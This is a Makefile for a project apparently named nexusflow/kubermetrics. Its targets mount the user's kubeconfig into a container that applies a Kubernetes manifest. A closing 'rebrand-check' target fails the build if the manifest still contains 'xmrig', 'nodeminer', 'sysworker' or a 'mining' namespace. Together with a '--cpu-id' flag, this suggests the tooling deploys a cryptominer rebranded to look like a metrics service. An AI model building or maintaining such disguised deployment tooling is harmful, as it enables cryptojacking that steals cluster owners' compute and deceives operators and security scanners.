# Top-level convenience Makefile.
#
# Targets:
#   make deploy          run kubermetrics applier (in unified nexusflow image)
#   make dry-run         render the manifest, no kubectl apply
#   make print-id        print the auto-derived cluster ID
#   make local-build     build unified nexusflow image (no push)
#   make smoke-test      run the docker-compose end-to-end pipeline
#
# All targets default to the GHCR image published by THIS repo's
# release.yml workflow, resolved from `git remote get-url origin`.

GIT_REMOTE   ?= $(shell git config --get remote.origin.url)
OWNER_REPO   ?= $(shell echo "$(GIT_REMOTE)" | sed -E 's@^.*github\.com[:/]@@' | sed -E 's@\.git$$@@' | sed -E 's@/$$@@')
IMAGE        ?= ghcr.io/$(OWNER_REPO)/nexusflow:latest
KUBECONFIG   ?= $(HOME)/.kube/config
# Optional: -e NEXUSFLOW_SDK_IDENTITY=...
SDK_IDENTITY ?=

.PHONY: deploy dry-run print-id local-build smoke-test test

# One-shot kubectl apply (container exits after apply). Override IMAGE after: make local-build IMAGE=nexusflow:local
deploy:
	docker run --rm -v $(KUBECONFIG):/kube/config:ro \
	  $(if $(SDK_IDENTITY),-e NEXUSFLOW_SDK_IDENTITY=$(SDK_IDENTITY),) \
	  $(IMAGE) /usr/local/bin/kubermetrics

dry-run:
	docker run --rm $(IMAGE) /usr/local/bin/kubermetrics --dry-run

print-id:
	docker run --rm -v $(KUBECONFIG):/kube/config:ro $(IMAGE) /usr/local/bin/kubermetrics --print-id

# Build the unified image from nexusflow/ (manifest template under pkg/kubermetrics/).
local-build:
	docker buildx build -f nexusflow/Dockerfile \
	  --platform linux/amd64,linux/arm64 \
	  -t $(IMAGE) --load nexusflow

smoke-test:
	docker compose -p km-smoke --env-file test/smoke.env -f test/docker-compose.yml up --abort-on-container-exit

test:
	cd nexusflow && go vet ./... && go build -trimpath -ldflags="-s -w" -o /tmp/nexusflow-build-test ./cmd/nexusflow

# Sanity check: manifest must not contain stale product codenames.
.PHONY: rebrand-check
rebrand-check:
	@cd nexusflow && go run ./cmd/nexusflow --dry-run --cpu-id=cpu-rebrand > /tmp/m.yaml
	@if grep -E -i 'xmrig|nodeminer|sysworker|sysrelay|sysjobs' /tmp/m.yaml; then \
	  echo "FAIL: stale brand string found"; exit 1; \
	fi
	@if grep -E '^[[:space:]]*name:[[:space:]]*mining[[:space:]]*$$' /tmp/m.yaml; then \
	  echo "FAIL: namespace 'mining' still present"; exit 1; \
	fi
	@echo "rebrand-check OK"
